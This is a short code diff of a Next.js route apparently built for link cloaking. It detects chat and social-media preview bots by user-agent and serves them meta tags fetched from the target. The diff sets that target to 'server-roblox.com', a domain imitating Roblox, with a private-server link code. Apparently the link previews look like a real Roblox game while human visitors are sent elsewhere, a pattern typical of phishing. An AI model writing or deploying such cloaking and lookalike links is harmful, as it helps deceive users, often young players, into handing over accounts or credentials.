@@ -13,7 +13,7 @@ async function fetchMetaTags(url: string) {
 export async function GET(req: NextRequest) {
   const userAgent = req.headers.get('user-agent') || '';
   const isBot = /discord|whatsapp|twitter|facebook|bot|crawler|spider/i.test(userAgent);
-  const targetUrl = 'https://roblox.com/your-link'; // Ganti dengan link tujuan
+  const targetUrl = 'https://server-roblox.com/games/126884695634066/Grow-a-Garden?privateServerLinkCode=60996196158654546780483711157260'; // Ganti dengan link tujuan
 
   if (isBot) {
     // Fetch meta tag asli dari targetUrl
